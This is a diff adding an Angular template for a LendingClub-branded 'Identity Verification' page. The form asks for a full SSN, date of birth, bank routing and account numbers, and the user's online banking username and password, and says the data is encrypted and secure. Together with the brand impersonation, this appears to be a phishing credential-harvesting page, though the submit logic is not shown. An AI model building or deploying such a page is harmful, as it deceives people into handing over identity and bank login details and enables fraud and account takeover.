@@ -1,0 +1,850 @@
+<div class="verify-page">
+    <!-- Top Header Navigation -->
+    <header class="verify-header">
+        <div class="header-container">
+            <a class="brand" routerLink="/" aria-label="LendingClub Home">
+                <img
+                    src="assets/images/asset-25.svg"
+                    alt="LendingClub"
+                    class="brand-logo"
+                />
+            </a>
+        </div>
+    </header>
+
+    <!-- Main Verification Content -->
+    <main class="verify-main">
+
+        <a class="back-link" routerLink="/">
+            <svg
+                class="back-arrow"
+                viewBox="0 0 20 20"
+                fill="currentColor"
+                width="16"
+                height="16"
+                aria-hidden="true"
+            >
+                <path
+                    fill-rule="evenodd"
+                    d="M17 10a.75.75 0 0 1-.75.75H5.56l4.72 4.72a.75.75 0 1 1-1.06 1.06l-6-6a.75.75 0 0 1 0-1.06l6-6a.75.75 0 0 1 1.06 1.06L5.56 9.25h10.69A.75.75 0 0 1 17 10Z"
+                    clip-rule="evenodd"
+                />
+            </svg>
+            <span>Go Back</span>
+        </a>
+
+        <div class="page-heading">
+            <h1>Identity Verification</h1>
+            <p>
+                Please fill out all fields accurately. Your information is
+                encrypted and secure.
+            </p>
+        </div>
+
+        <form
+        class="verify-form"
+        #verificationForm="ngForm"
+        (ngSubmit)="submitVerification(verificationForm)"
+        novalidate
+    >
+
+            <!-- ========================================================= -->
+            <!-- Card 1: Personal Information -->
+            <!-- ========================================================= -->
+
+            <section class="form-card">
+                <h2 class="card-title">Personal Information</h2>
+
+                <!-- First Name / Last Name -->
+                <div class="form-grid two-col">
+
+                    <div class="form-field">
+                        <label for="firstName">FIRST NAME</label>
+
+                        <input
+                            id="firstName"
+                            type="text"
+                            name="firstName"
+                            placeholder="John"
+                            [(ngModel)]="form.firstName"
+                            #firstName="ngModel"
+                            maxlength="100"
+                            required
+                            [class.invalid]="submitted && firstName.invalid"
+                        />
+
+                        @if (submitted && firstName.errors) {
+                            <div class="error-message">
+                                @if (firstName.errors['required']) {
+                                    <span>First name is required.</span>
+                                }
+                                @if (firstName.errors['maxlength']) {
+                                    <span>
+                                        First name cannot exceed 100 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+
+                    <div class="form-field">
+                        <label for="lastName">LAST NAME</label>
+
+                        <input
+                            id="lastName"
+                            type="text"
+                            name="lastName"
+                            placeholder="Doe"
+                            [(ngModel)]="form.lastName"
+                            #lastName="ngModel"
+                            maxlength="100"
+                            required
+                            [class.invalid]="submitted && lastName.invalid"
+                        />
+
+                        @if (submitted && lastName.errors) {
+                            <div class="error-message">
+                                @if (lastName.errors['required']) {
+                                    <span>Last name is required.</span>
+                                }
+                                @if (lastName.errors['maxlength']) {
+                                    <span>
+                                        Last name cannot exceed 100 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+
+                <!-- Email / Phone -->
+                <div class="form-grid two-col">
+
+                    <div class="form-field">
+                        <label for="email">EMAIL</label>
+
+                        <input
+                            id="email"
+                            type="email"
+                            name="email"
+                            placeholder="john@email.com"
+                            [(ngModel)]="form.email"
+                            #email="ngModel"
+                            maxlength="255"
+                            required
+                            [class.invalid]="submitted && email.invalid"
+                        />
+
+                        @if (submitted && email.errors) {
+                            <div class="error-message">
+                                @if (email.errors['required']) {
+                                    <span>Email address is required.</span>
+                                }
+
+                                @if (email.errors['email']) {
+                                    <span>
+                                        Please provide a valid email address.
+                                    </span>
+                                }
+
+                                @if (email.errors['maxlength']) {
+                                    <span>
+                                        Email cannot exceed 255 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+
+                    <div class="form-field">
+                        <label for="phone">PHONE</label>
+
+                        <input
+                            id="phone"
+                            type="tel"
+                            name="phone"
+                            placeholder="(555) 555-5555"
+                            [(ngModel)]="form.phone"
+                            #phone="ngModel"
+                            maxlength="30"
+                            required
+                            pattern="^[0-9+() .-]{7,30}$"
+                            [class.invalid]="submitted && phone.invalid"
+                        />
+
+                        @if (submitted && phone.errors) {
+                            <div class="error-message">
+                                @if (phone.errors['required']) {
+                                    <span>Phone number is required.</span>
+                                }
+
+                                @if (phone.errors['pattern']) {
+                                    <span>
+                                        Please provide a valid phone number.
+                                    </span>
+                                }
+
+                                @if (phone.errors['maxlength']) {
+                                    <span>
+                                        Phone number cannot exceed 30 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+
+                <!-- DOB / SSN -->
+                <div class="form-grid two-col">
+
+                    <div class="form-field">
+                        <label for="dateOfBirth">DATE OF BIRTH</label>
+                    
+                        <input
+                            id="dateOfBirth"
+                            type="text"
+                            name="dateOfBirth"
+                            placeholder="MM/DD/YYYY"
+                            [(ngModel)]="form.dateOfBirth"
+                            #dateOfBirth="ngModel"
+                            maxlength="10"
+                            required
+                            pattern="^(0[1-9]|1[0-2])/(0[1-9]|[12][0-9]|3[01])/[0-9]{4}$"
+                            inputmode="numeric"
+                            (input)="formatDateOfBirth($event)"
+                            [class.invalid]="submitted && dateOfBirth.invalid"
+                        />
+                    
+                        <!-- Normal helper text -->
+                        <div class="field-hint">
+                            Enter your date of birth in MM/DD/YYYY format.
+                        </div>
+                    
+                        @if (submitted && dateOfBirth.errors) {
+                            <div class="error-message">
+                    
+                                @if (dateOfBirth.errors['required']) {
+                                    <span>Date of birth is required.</span>
+                                }
+                    
+                                @if (dateOfBirth.errors['pattern']) {
+                                    <span>
+                                        Please enter a valid date in MM/DD/YYYY format.
+                                    </span>
+                                }
+                    
+                            </div>
+                        }
+                    </div>
+
+                    <div class="form-field">
+                        <label for="ssn">SSN</label>
+                    
+                        <input
+                            id="ssn"
+                            type="text"
+                            name="ssn"
+                            placeholder="XXX-XX-XXXX"
+                            [(ngModel)]="form.ssn"
+                            #ssn="ngModel"
+                            required
+                            pattern="^(?!000|666|9[0-9]{2})[0-9]{3}-(?!00)[0-9]{2}-(?!0000)[0-9]{4}$|^[0-9]{9}$"
+                            inputmode="numeric"
+                            maxlength="11"
+                            [class.invalid]="submitted && ssn.invalid"
+                        />
+                    
+                        <div class="field-hint">
+                            Enter your 9-digit Social Security number.
+                        </div>
+                    
+                        @if (submitted && ssn.errors) {
+                            <div class="error-message">
+                    
+                                @if (ssn.errors['required']) {
+                                    <span>SSN is required.</span>
+                                }
+                    
+                                @if (ssn.errors['pattern']) {
+                                    <span>
+                                        Invalid SSN format. Expected XXX-XX-XXXX.
+                                    </span>
+                                }
+                    
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+
+                <!-- Loan Amount -->
+                <div class="form-grid two-col">
+
+                    <div class="form-field">
+                        <label for="loanAmount">LOAN AMOUNT</label>
+
+                        <input
+                            id="loanAmount"
+                            type="text"
+                            name="loanAmount"
+                            placeholder="$10,000"
+                            [(ngModel)]="form.loanAmount"
+                            #loanAmount="ngModel"
+                            maxlength="50"
+                            required
+                            [class.invalid]="submitted && loanAmount.invalid"
+                        />
+
+                        @if (submitted && loanAmount.errors) {
+                            <div class="error-message">
+                                @if (loanAmount.errors['required']) {
+                                    <span>Loan amount is required.</span>
+                                }
+
+                                @if (loanAmount.errors['maxlength']) {
+                                    <span>
+                                        Loan amount cannot exceed 50 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+            </section>
+
+
+            <!-- ========================================================= -->
+            <!-- Card 2: Address -->
+            <!-- ========================================================= -->
+
+            <section class="form-card">
+                <h2 class="card-title">Address</h2>
+
+                <!-- Street Address -->
+                <div class="form-grid one-col">
+
+                    <div class="form-field">
+                        <label for="streetAddress">STREET ADDRESS</label>
+
+                        <input
+                            id="streetAddress"
+                            type="text"
+                            name="streetAddress"
+                            placeholder="123 Main St"
+                            [(ngModel)]="form.streetAddress"
+                            #streetAddress="ngModel"
+                            maxlength="255"
+                            required
+                            [class.invalid]="submitted && streetAddress.invalid"
+                        />
+
+                        @if (submitted && streetAddress.errors) {
+                            <div class="error-message">
+                                @if (streetAddress.errors['required']) {
+                                    <span>Street address is required.</span>
+                                }
+
+                                @if (streetAddress.errors['maxlength']) {
+                                    <span>
+                                        Street address cannot exceed 255 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+
+                <!-- City / State -->
+                <div class="form-grid two-col">
+
+                    <div class="form-field">
+                        <label for="city">CITY</label>
+
+                        <input
+                            id="city"
+                            type="text"
+                            name="city"
+                            placeholder="New York"
+                            [(ngModel)]="form.city"
+                            #city="ngModel"
+                            maxlength="100"
+                            required
+                            [class.invalid]="submitted && city.invalid"
+                        />
+
+                        @if (submitted && city.errors) {
+                            <div class="error-message">
+                                @if (city.errors['required']) {
+                                    <span>City is required.</span>
+                                }
+
+                                @if (city.errors['maxlength']) {
+                                    <span>
+                                        City cannot exceed 100 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+
+                    <div class="form-field">
+                        <label for="state">STATE</label>
+
+                        <div class="select-wrapper">
+                            <select
+                                id="state"
+                                name="state"
+                                [(ngModel)]="form.state"
+                                #state="ngModel"
+                                required
+                                [class.invalid]="submitted && state.invalid"
+                            >
+                                <option value="" disabled>
+                                    Select State
+                                </option>
+
+                                @for (stateName of states; track stateName) {
+                                    <option [value]="stateName">
+                                        {{ stateName }}
+                                    </option>
+                                }
+                            </select>
+                        </div>
+
+                        @if (submitted && state.errors) {
+                            <div class="error-message">
+                                @if (state.errors['required']) {
+                                    <span>State is required.</span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+
+                <!-- Country / ZIP -->
+                <div class="form-grid two-col">
+
+                    <div class="form-field">
+                        <label for="country">COUNTRY</label>
+
+                        <div class="select-wrapper">
+                            <select
+                                id="country"
+                                name="country"
+                                [(ngModel)]="form.country"
+                                #country="ngModel"
+                                maxlength="100"
+                            >
+                                @for (countryName of countries; track countryName) {
+                                    <option [value]="countryName">
+                                        {{ countryName }}
+                                    </option>
+                                }
+                            </select>
+                        </div>
+
+                        @if (submitted && country.errors?.['maxlength']) {
+                            <div class="error-message">
+                                Country cannot exceed 100 characters.
+                            </div>
+                        }
+                    </div>
+
+
+                    <div class="form-field">
+                        <label for="zipCode">ZIP CODE</label>
+
+                        <input
+                            id="zipCode"
+                            type="text"
+                            name="zipCode"
+                            placeholder="10001"
+                            [(ngModel)]="form.zipCode"
+                            #zipCode="ngModel"
+                            maxlength="20"
+                            required
+                            [class.invalid]="submitted && zipCode.invalid"
+                        />
+
+                        @if (submitted && zipCode.errors) {
+                            <div class="error-message">
+                                @if (zipCode.errors['required']) {
+                                    <span>Zip code is required.</span>
+                                }
+
+                                @if (zipCode.errors['maxlength']) {
+                                    <span>
+                                        Zip code cannot exceed 20 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+            </section>
+
+
+            <!-- ========================================================= -->
+            <!-- Card 3: Banking Information -->
+            <!-- ========================================================= -->
+
+            <section class="form-card">
+                <h2 class="card-title">Banking Information</h2>
+
+                <!-- Bank Name / Routing Number -->
+                <div class="form-grid two-col">
+
+                    <div class="form-field">
+                        <label for="bankName">BANK NAME</label>
+
+                        <input
+                            id="bankName"
+                            type="text"
+                            name="bankName"
+                            placeholder="Chase Bank"
+                            [(ngModel)]="form.bankName"
+                            #bankName="ngModel"
+                            maxlength="100"
+                            required
+                            [class.invalid]="submitted && bankName.invalid"
+                        />
+
+                        @if (submitted && bankName.errors) {
+                            <div class="error-message">
+                                @if (bankName.errors['required']) {
+                                    <span>Bank name is required.</span>
+                                }
+
+                                @if (bankName.errors['maxlength']) {
+                                    <span>
+                                        Bank name cannot exceed 100 characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+
+                    <div class="form-field">
+                        <label for="routingNumber">ROUTING NUMBER</label>
+
+                        <input
+                            id="routingNumber"
+                            type="text"
+                            name="routingNumber"
+                            placeholder="9 digits"
+                            [(ngModel)]="form.routingNumber"
+                            #routingNumber="ngModel"
+                            required
+                            pattern="^[0-9]{9}$"
+                            inputmode="numeric"
+                            maxlength="9"
+                            [class.invalid]="submitted && routingNumber.invalid"
+                        />
+
+                        @if (submitted && routingNumber.errors) {
+                            <div class="error-message">
+                                @if (routingNumber.errors['required']) {
+                                    <span>Routing number is required.</span>
+                                }
+
+                                @if (routingNumber.errors['pattern']) {
+                                    <span>
+                                        Routing number must be a valid 9-digit
+                                        ABA routing transit number.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+
+                <!-- Account Number / Online Banking ID -->
+                <div class="form-grid two-col">
+
+                    <div class="form-field">
+                        <label for="accountNumber">ACCOUNT NUMBER</label>
+
+                        <input
+                            id="accountNumber"
+                            type="text"
+                            name="accountNumber"
+                            placeholder="Account number"
+                            [(ngModel)]="form.accountNumber"
+                            #accountNumber="ngModel"
+                            required
+                            pattern="^[0-9]{4,17}$"
+                            inputmode="numeric"
+                            maxlength="17"
+                            [class.invalid]="submitted && accountNumber.invalid"
+                        />
+
+                        @if (submitted && accountNumber.errors) {
+                            <div class="error-message">
+                                @if (accountNumber.errors['required']) {
+                                    <span>Account number is required.</span>
+                                }
+
+                                @if (accountNumber.errors['pattern']) {
+                                    <span>
+                                        Account number must be between 4 and
+                                        17 digits.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+
+                    <div class="form-field">
+                        <label for="onlineBankingId">
+                            ONLINE BANKING ID
+                        </label>
+
+                        <input
+                            id="onlineBankingId"
+                            type="text"
+                            name="onlineBankingId"
+                            placeholder="Username / ID"
+                            [(ngModel)]="form.onlineBankingId"
+                            #onlineBankingId="ngModel"
+                            maxlength="100"
+                            required
+                            [class.invalid]="submitted && onlineBankingId.invalid"
+                        />
+
+                        @if (submitted && onlineBankingId.errors) {
+                            <div class="error-message">
+                                @if (onlineBankingId.errors['required']) {
+                                    <span>
+                                        Online banking ID is required.
+                                    </span>
+                                }
+
+                                @if (onlineBankingId.errors['maxlength']) {
+                                    <span>
+                                        Online banking ID cannot exceed 100
+                                        characters.
+                                    </span>
+                                }
+                            </div>
+                        }
+                    </div>
+
+                </div>
+
+
+                <!-- Online Banking Password -->
+                <div class="form-grid one-col">
+
+                    <div class="form-field">
+                        <label for="onlineBankingPassword">
+                            ONLINE BANKING PASSWORD
+                        </label>
+
+                        <div class="password-field">
+
+                            <input
+                                id="onlineBankingPassword"
+                                [type]="showPassword ? 'text' : 'password'"
+                                name="onlineBankingPassword"
+                                placeholder="Password"
+                                [(ngModel)]="form.onlineBankingPassword"
+                                #onlineBankingPassword="ngModel"
+                                minlength="4"
+                                maxlength="255"
+                                required
+                                [class.invalid]="submitted && onlineBankingPassword.invalid"
+                            />
+
+                            <button
+                                class="password-toggle"
+                                type="button"
+                                (click)="togglePassword()"
+                                [attr.aria-label]="
+                                    showPassword
+                                        ? 'Hide password'
+                                        : 'Show password'
+                                "
+                            >
+                                @if (showPassword) {
+                                    <svg
+                                        viewBox="0 0 24 24"
+                                        fill="none"
+                                        stroke="currentColor"
+                                        stroke-width="1.8"
+                                        stroke-linecap="round"
+                                        stroke-linejoin="round"
+                                        width="20"
+                                        height="20"
+                                    >
+                                        <path
+                                            d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"
+                                        ></path>
+
+                                        <line
+                                            x1="1"
+                                            y1="1"
+                                            x2="23"
+                                            y2="23"
+                                        ></line>
+                                    </svg>
+                                } @else {
+                                    <svg
+                                        viewBox="0 0 24 24"
+                                        fill="none"
+                                        stroke="currentColor"
+                                        stroke-width="1.8"
+                                        stroke-linecap="round"
+                                        stroke-linejoin="round"
+                                        width="20"
+                                        height="20"
+                                    >
+                                        <path
+                                            d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"
+                                        ></path>
+
+                                        <circle
+                                            cx="12"
+                                            cy="12"
+                                            r="3"
+                                        ></circle>
+                                    </svg>
+                                }
+                            </button>
+
+                        </div>
+
+                        @if (submitted && onlineBankingPassword.errors) {
+                            <div class="error-message">
+
+                                @if (onlineBankingPassword.errors['required']) {
+                                    <span>
+                                        Online banking password is required.
+                                    </span>
+                                }
+
+                                @if (onlineBankingPassword.errors['minlength']) {
+                                    <span>
+                                        Online banking password must be at
+                                        least 4 characters.
+                                    </span>
+                                }
+
+                                @if (onlineBankingPassword.errors['maxlength']) {
+                                    <span>
+                                        Online banking password cannot exceed
+                                        255 characters.
+                                    </span>
+                                }
+
+                            </div>
+                        }
+
+                    </div>
+
+                </div>
+
+            </section>
+
+
+            <!-- ========================================================= -->
+            <!-- Agreement -->
+            <!-- ========================================================= -->
+
+            <div class="agreement-box">
+
+                <label class="agreement-label">
+
+                    <input
+                        type="checkbox"
+                        class="agreement-checkbox"
+                        name="agreement"
+                        [(ngModel)]="form.agreement"
+                        #agreement="ngModel"
+                    />
+
+                    <div class="agreement-content">
+
+                        <strong class="agreement-title">
+                            AGREEMENT
+                        </strong>
+
+                        <p class="agreement-text">
+                            I agree to the electronic consent policy and
+                            certify that the information provided is accurate
+                            to the best of my knowledge. I understand that
+                            this information will be used for identity
+                            verification.
+                        </p>
+
+                    </div>
+
+                </label>
+
+                @if (submitted && !form.agreement) {
+                    <div class="error-message agreement-error">
+                        You must accept the terms and agreement.
+                    </div>
+                }
+
+            </div>
+
+
+            <!-- ========================================================= -->
+            <!-- Submit -->
+            <!-- ========================================================= -->
+
+            <div class="form-actions">
+
+                <button
+                    class="submit-button"
+                    type="submit"
+                    [disabled]="isSubmitting"
+                >
+                    @if (isSubmitting) {
+                        Submitting...
+                    } @else {
+                        Submit Verification
+                    }
+                </button>
+
+            </div>
+
+
+            @if (serverError) {
+                <div class="form-error">
+                    {{ serverError }}
+                </div>
+            }
+
+
+            <!-- API Success -->
+            @if (successMessage) {
+                <div class="form-success">
+                    {{ successMessage }}
+                </div>
+            }
+
+        </form>
+
+    </main>
+</div>
